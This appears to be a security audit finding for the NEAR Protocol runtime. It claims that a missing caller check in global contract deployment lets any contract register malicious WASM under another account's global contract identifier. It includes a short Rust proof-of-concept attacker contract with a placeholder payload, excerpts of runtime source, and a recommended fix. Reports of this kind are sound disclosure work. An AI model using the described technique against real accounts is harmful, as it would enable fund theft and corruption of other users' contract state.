### Title
Unprivileged Cross-Contract Call Can Register Malicious Code Under Any Account's Global Contract Identifier - (`runtime/runtime/src/global_contracts.rs`)

### Summary

`action_deploy_global_contract` enforces no check that `predecessor_id == receiver_id` when `GlobalContractDeployMode::AccountId` is used. Any deployed contract can invoke the `promise_batch_action_deploy_global_contract_by_account_id` host function targeting an arbitrary `receiver_id`, causing the runtime to register attacker-supplied WASM under the victim account's `GlobalContractIdentifier::AccountId` namespace entry. Every account on every shard that subsequently calls `UseGlobalContract(AccountId("victim.near"))` will execute the attacker's code.

### Finding Description

**Normal path (direct transaction):** By convention, `DeployGlobalContract` transactions are constructed with `signer_id == receiver_id`. The docs list the actions that *require* `predecessor_id == receiver_id` at the protocol level (`DeployContract`, `Stake`, `AddKey`, `DeleteKey`, `DeleteAccount`). `DeployGlobalContract` is **not** in that list.

**Cross-contract call path (the bypass):** The host function `promise_batch_action_deploy_global_contract_by_account_id` lets any executing contract append a `DeployGlobalContract(AccountId)` action to a receipt targeting *any* `receiver_id`. When that receipt is applied, `action_deploy_global_contract` is called with `account_id = receiver_id` (the victim), and `initiate_distribution` registers the attacker's code under `GlobalContractIdentifier::AccountId(victim_account_id)` with no authorization check:

```rust
// runtime/runtime/src/global_contracts.rs  lines 51-58
initiate_distribution(
    state_update,
    account_id.clone(),   // ← this is receipt.receiver_id, NOT the predecessor
    deploy_contract.code.clone(),
    &deploy_contract.deploy_mode,
    apply_state.shard_id,
    result,
)?;
```

Inside `initiate_distribution` the identifier is built as:

```rust
GlobalContractDeployMode::AccountId => {
    GlobalContractIdentifier::AccountId(account_id.clone())
}
```

`validate_deploy_global_contract_action` only checks code size:

```rust
// runtime/runtime/src/action_validation.rs  lines 226-237
fn validate_deploy_global_contract_action(
    limit_config: &LimitConfig,
    action: &DeployGlobalContractAction,
) -> Result<(), ActionsValidationError> {
    if action.code.len() as u64 > limit_config.max_contract_size {
        return Err(ActionsValidationError::ContractSizeExceeded { ... });
    }
    Ok(())
}
```

No check that `predecessor_id == receiver_id` exists anywhere in the action dispatch path for `DeployGlobalContract`.

The distribution receipt then propagates the attacker's code to every shard, overwriting any previously registered contract under the victim's account ID (the nonce is incremented by `increment_nonce` on each new deployment, so the attacker's higher-nonce receipt wins the freshness check).

### Impact Explanation

**Corrupted value:** `TrieKey::GlobalContractCode { identifier: GlobalContractIdentifier::AccountId(victim_account_id) }` on every shard — replaced with attacker-supplied WASM.

**Downstream effect:** Every account that has called `UseGlobalContract(AccountId("victim.near"))` now executes the attacker's code on any subsequent function call. The attacker's WASM runs with the *callee* account's storage and balance, enabling arbitrary state corruption and fund theft across all accounts that reference the victim's global contract identifier.

Additionally, the storage cost for the deployment is deducted from the victim account's balance (`account.set_amount(updated_balance)`), draining NEAR without the victim's consent.

### Likelihood Explanation

Reachable by any unprivileged NEAR user who can deploy a contract (costs a few NEAR). The attack requires:
1. Deploy a malicious contract on any account.
2. Call `promise_batch_create("victim.near")` + `promise_batch_action_deploy_global_contract_by_account_id(receipt_idx, malicious_wasm)` from within that contract.

No validator, operator, or admin privilege is needed. The host function is available to all contracts.

### Recommendation

Add a `predecessor_id == receiver_id` guard inside `action_deploy_global_contract` (or in `validate_action_with_mode` for `DeployGlobalContract`) when `deploy_mode == GlobalContractDeployMode::AccountId`, mirroring the existing restriction on `DeployContract`, `Stake`, `AddKey`, `DeleteKey`, and `DeleteAccount`. For `CodeHash` mode no such restriction is needed because the identifier is content-addressed and cannot be spoofed.

### Proof of Concept

```rust
// Attacker's contract (deployed on attacker.near):
#[near_bindgen]
impl AttackerContract {
    pub fn exploit(&self, victim: AccountId) {
        // Create a receipt targeting victim.near
        let receipt = env::promise_batch_create(&victim);
        // Append DeployGlobalContract(AccountId) with malicious WASM
        env::promise_batch_action_deploy_global_contract_by_account_id(
            receipt,
            MALICIOUS_WASM,
        );
    }
}
```

After `exploit("victim.near")` executes:
- `TrieKey::GlobalContractCode { identifier: AccountId("victim.near") }` on every shard contains the attacker's WASM.
- Any account `alice.near` that previously called `UseGlobalContract(AccountId("victim.near"))` now executes the attacker's code when called.
- `victim.near`'s balance is reduced by `global_contract_storage_amount_per_byte * len(MALICIOUS_WASM)`.

pub(crate) fn action_deploy_global_contract(
    state_update: &mut TrieUpdate,
    account: &mut Account,
    account_id: &AccountId,
    apply_state: &ApplyState,
    deploy_contract: &DeployGlobalContractAction,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let _span = tracing::debug_span!(target: "runtime", "action_deploy_global_contract").entered();

    let storage_cost = apply_state
        .config
        .fees
        .storage_usage_config
        .global_contract_storage_amount_per_byte
        .saturating_mul(deploy_contract.code.len() as u128);
    let Some(updated_balance) = account.amount().checked_sub(storage_cost) else {
        result.result = Err(ActionErrorKind::LackBalanceForState {
            account_id: account_id.clone(),
            amount: storage_cost,
        }
        .into());
        return Ok(());
    };
    result.tokens_burnt =
        result.tokens_burnt.checked_add(storage_cost).ok_or(IntegerOverflowError)?;
    account.set_amount(updated_balance);

    initiate_distribution(
        state_update,
        account_id.clone(),
        deploy_contract.code.clone(),
        &deploy_contract.deploy_mode,
        apply_state.shard_id,
        result,
    )?;

    Ok(())
}

fn initiate_distribution(
    state_update: &mut TrieUpdate,
    account_id: AccountId,
    contract_code: Arc<[u8]>,
    deploy_mode: &GlobalContractDeployMode,
    current_shard_id: ShardId,
    result: &mut ActionResult,
) -> Result<(), RuntimeError> {
    let id = match deploy_mode {
        GlobalContractDeployMode::CodeHash => {
            GlobalContractIdentifier::CodeHash(hash(&contract_code))
        }
        GlobalContractDeployMode::AccountId => {
            GlobalContractIdentifier::AccountId(account_id.clone())
        }
    };
    // Increment the nonce and write it to state immediately to prevent multiple
    // distributions with the same nonce from being initiated. This requires
    // allowing the same nonce in the freshness check when applying the
    // distribution receipt.
    let nonce = increment_nonce(state_update, &id)?;
    let distribution_receipt =
        GlobalContractDistributionReceipt::new(id, current_shard_id, vec![], contract_code, nonce);
    let distribution_receipts =
        Receipt::new_global_contract_distribution(account_id, distribution_receipt);
    // No need to set receipt_id here, it will be generated as part of apply_action_receipt
    result.new_receipts.push(distribution_receipts);
    Ok(())

/// Validates `DeployGlobalContractAction`. Checks that the given contract size doesn't exceed the limit.
fn validate_deploy_global_contract_action(
    limit_config: &LimitConfig,
    action: &DeployGlobalContractAction,
) -> Result<(), ActionsValidationError> {
    if action.code.len() as u64 > limit_config.max_contract_size {
        return Err(ActionsValidationError::ContractSizeExceeded {
            size: action.code.len() as u64,
            limit: limit_config.max_contract_size,
        });
    }

    Ok(())
}
